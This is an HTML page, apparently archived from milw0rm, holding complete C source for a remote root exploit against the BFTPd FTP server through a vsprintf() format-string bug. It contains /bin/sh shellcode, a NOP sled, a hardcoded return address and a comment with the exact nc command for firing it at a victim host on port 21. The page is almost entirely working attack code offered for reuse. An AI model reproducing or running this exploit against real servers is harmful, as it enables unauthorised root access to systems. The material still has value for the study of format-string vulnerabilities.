<html><head><title>BFTPd vsprintf() Format Strings Exploit</title></head><pre>*
 *  Copyright (c) 2000 - Security.is
 *
 *  The following material may be freely redistributed, provided
 *  that the code or the disclaimer have not been partly removed,
 *  altered or modified in any way. The material is the property
 *  of security.is. You are allowed to adopt the represented code
 *  in your programs, given that you give credits where it's due.
 *
 *  A no-name ftp-server has a serious bug which leads to remote root.
 *  Anyway, we exploit vsprintf() via format-string.
 *
 *  Discovered/coded by: DiGiT - teddi@linux.is
 *  Greets: security.is, ADM
 *  note: Coded during security.is weekend ;&gt;
 *
 *  Run like: (./bftpexp ; cat) | nc bftpd.victim.com 21
 *  offset is optional and is arg1
 * 
 */

#include &lt;stdio.h&gt;

char shellcode[] =
  &quot;\x31\xc0\x31\xdb\x04\x0b\xcd\x80\x31\xc0\x40\x40\xcd\x80\x85&quot;
  &quot;\xc0\x75\x28\x89\xd9\x31\xc0\x41\x04\x3f\xcd\x80\x31\xc0\x04&quot;
  &quot;\x3f\x41\xeb\x1f\x31\xc0\x5f\x89\x7f\x08\x88\x47\x07\x89\x47&quot;
  &quot;\x0c\x89\xfb\x8d\x4f\x08\x8d\x57\x0c\x04\x0b\xcd\x80\x31\xc0&quot;
  &quot;\x31\xdb\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

#define ADDR 0xbffff83c

int main(int argc, char *argv[]) 
{
  char lenbuf[1024],nopbuf[256], addrbuf[32], buf[256];
  int offset=0,length, nopcount=100,i;
  long nop_addr = ADDR;

  if(argc &gt; 1)
    offset = atoi(argv[1]);

  memset (nopbuf, '\x90', nopcount);
  nop_addr = nop_addr + offset;

  strcpy(buf, nopbuf);
  strcat(buf, shellcode);

  length=1024-strlen(shellcode)-nopcount+4-14;

  strcat(buf, &quot;%.&quot;);
  sprintf(lenbuf, &quot;%dd&quot;, length);
  strcat(buf, lenbuf);

  sprintf(addrbuf, &quot;%c%c%c%c&quot;,
    (unsigned char) ((nop_addr &gt;&gt;  0) &amp; 0xff),
    (unsigned char) ((nop_addr &gt;&gt;  8) &amp; 0xff),
    (unsigned char) ((nop_addr &gt;&gt; 16) &amp; 0xff),
    (unsigned char) ((nop_addr &gt;&gt; 24) &amp; 0xff));

  for(i = 0 ; i &lt; 4 ; i++) 
    strcat(buf, addrbuf);

  fprintf(stderr, &quot;Bftpd remote exploit, by DiGiT\n&quot;);
  fprintf(stderr, &quot;Using Address = 0x%x\n&quot;, nop_addr);
  printf(&quot;%s\n&quot;, buf);

  return 0;
}


// milw0rm.com [2000-11-29]</pre></html>